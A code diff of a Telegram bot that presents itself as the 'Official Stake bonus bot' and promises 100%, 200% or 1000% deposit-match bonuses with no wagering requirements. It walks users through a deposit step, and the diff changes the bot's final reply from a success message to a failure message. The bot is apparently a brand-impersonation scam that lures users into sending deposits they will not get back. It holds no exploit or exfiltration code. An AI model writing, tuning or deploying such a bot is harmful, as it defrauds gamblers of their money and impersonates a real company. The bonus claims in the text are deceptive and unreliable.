@@ -14,7 +14,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendPhoto(chatId, "public/pic.jpg", {
     }).then(() => {
         // Send message with inline buttons
-        bot.sendMessage(chatId, "Welcome to the Official Stake bonus bot where you can get special Stake bonuses available to every Stake user!\n\n🚀 100% DEPOSIT MATCH BONUS\n\n🚨 Wager requirements: NONE\n\n🏧 EARLY ACCESS TO BONUSES", {
+        bot.sendMessage(chatId, "Welcome to the Official Stake bonus bot where you can get special Stake bonuses available to every Stake user!\n\n🚀 200% DEPOSIT MATCH BONUS\n\n🚨 Wager requirements: NONE\n\n🏧 EARLY ACCESS TO BONUSES", {
             reply_markup: {
                 inline_keyboard: [
                     [{ text: "💰 Claim Deposit Bonus 💰", callback_data: "deposit_bonus" }],
@@ -248,7 +248,7 @@ bot.on("callback_query", (query) => {
     if (data === "continue_after_deposit") {
         let username = userSessions[chatId]?.username || "User";
 
-        bot.sendMessage(chatId, `${username}, After you click the submit button, your 1000% deposit match bonus claim will be completed and your Stake account will be credited after (1) confirmation is reached.`, {
+        bot.sendMessage(chatId, `${username}, After you click the submit button, your 200% deposit match bonus claim will be completed and your Stake account will be credited after (1) confirmation is reached.`, {
             parse_mode: "Markdown",
             reply_markup: {
                 inline_keyboard: [
@@ -257,7 +257,7 @@ bot.on("callback_query", (query) => {
             }
         });
     } else if (data === "submit_deposit") {
-        bot.sendMessage(chatId, "✅ You have successfully completed the deposit match bonus.");
+        bot.sendMessage(chatId, "❌ You have failed to complete the deposit match bonus.");
     }
 });
 
